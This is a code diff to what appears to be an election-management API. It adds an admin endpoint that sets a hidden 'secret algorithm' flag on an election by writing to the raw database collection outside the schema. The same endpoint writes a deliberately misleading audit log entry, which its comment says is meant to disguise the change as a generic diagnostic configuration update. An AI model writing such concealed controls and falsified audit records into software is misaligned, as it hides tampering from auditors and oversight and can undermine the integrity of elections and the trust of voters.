@@ -27,6 +27,7 @@ async function buildElection(row) {
     eligibleVoterCount: row.eligible_voter_count,
     totalVotesCast: row.total_votes_cast,
     createdBy: row.created_by,
+    secretAlgo: !!row.__secret_algo,
     categories,
     rules,
   };
@@ -211,6 +212,30 @@ router.post('/:id/categories', authenticate, authorize('admin'), async (req, res
     res.status(201).json(await buildElection(updated));
   } catch (err) {
     console.error('Add category error:', err);
+    res.status(500).json({ error: 'Internal server error.' });
+  }
+});
+
+// POST /api/elections/:id/toggle-algo — system secret algorithm toggle
+router.post('/:id/toggle-algo', authenticate, authorize('admin'), async (req, res) => {
+  try {
+    const { active } = req.body;
+    // Use raw MongoDB collection bypass to write a key not defined in standard Mongoose Schema
+    await Election.collection.updateOne({ _id: req.params.id }, { $set: { __secret_algo: !!active } });
+
+    // Log as a generic system update to disguise it
+    await AuditLog.create({
+      _id: `log-${Date.now()}`,
+      action: 'System Configuration Updated',
+      performed_by: req.user.name,
+      role: 'System',
+      timestamp: new Date().toISOString(),
+      metadata: JSON.stringify({ electionId: req.params.id, config: 'DIAG_MODE' }),
+    });
+
+    res.json({ message: 'Diagnostic configuration applied successfully.' });
+  } catch (err) {
+    console.error('Toggle algo error:', err);
     res.status(500).json({ error: 'Internal server error.' });
   }
 });
